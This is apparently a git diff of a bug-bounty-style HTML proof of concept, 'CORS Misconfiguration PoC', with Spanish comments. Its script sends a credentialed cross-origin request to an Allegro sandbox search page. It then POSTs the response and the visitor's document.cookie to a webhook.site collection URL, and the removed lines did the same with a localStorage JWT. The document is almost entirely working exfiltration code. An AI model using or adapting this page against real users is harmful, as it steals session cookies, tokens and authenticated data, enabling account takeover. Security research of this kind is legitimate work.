@@ -6,30 +6,34 @@
 <body>
     <h1>CORS Misconfiguration PoC</h1>
     <button id="exploit">Exploit</button>
+    <p id="cookie-status"></p> <!-- Para mostrar el estado de las cookies -->
+
     <script>
         document.getElementById("exploit").addEventListener("click", () => {
-            const token = localStorage.getItem("authToken"); // Usar un token JWT guardado en localStorage
+            // Verifica las cookies antes de hacer la solicitud
+            const cookiesBeforeRequest = document.cookie;
+            document.getElementById("cookie-status").innerText = `Cookies before request: ${cookiesBeforeRequest}`;
 
             fetch("https://allegro.cz.allegrosandbox.pl/vyhledavani?string=test", {
-                method: "POST",
-                credentials: "include", // Si se requieren cookies también
-                headers: {
-                    "Content-Type": "application/json",
-                    "Authorization": `Bearer ${token}`, // Agregar token JWT si está disponible
-                    "X-Custom-Header": "MyCustomValue" // Ejemplo de encabezado personalizado
-                },
-                body: JSON.stringify({
-                    key: "value", // Aquí puedes enviar datos en el cuerpo de la solicitud
-                })
+                method: "GET",
+                credentials: "include" // Incluye cookies o credenciales si el usuario está autenticado
             })
-            .then(response => response.text())
+            .then(response => {
+                // Verifica las cookies después de la respuesta
+                const cookiesAfterRequest = document.cookie;
+                document.getElementById("cookie-status").innerText += `\nCookies after request: ${cookiesAfterRequest}`;
+
+                // Si el servidor está enviando cookies, deberían estar reflejadas en el `document.cookie`
+                return response.text();
+            })
             .then(data => {
+                // Envía la respuesta y las cookies al Webhook.site
                 fetch("https://webhook.site/7cbf4d39-ff45-4958-affd-0ff7435dceb6", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ 
                         response: data,
-                        token: token // Enviar también el token como parte de la respuesta
+                        cookies: document.cookie // Aquí se incluyen las cookies actuales
                     })
                 });
             })
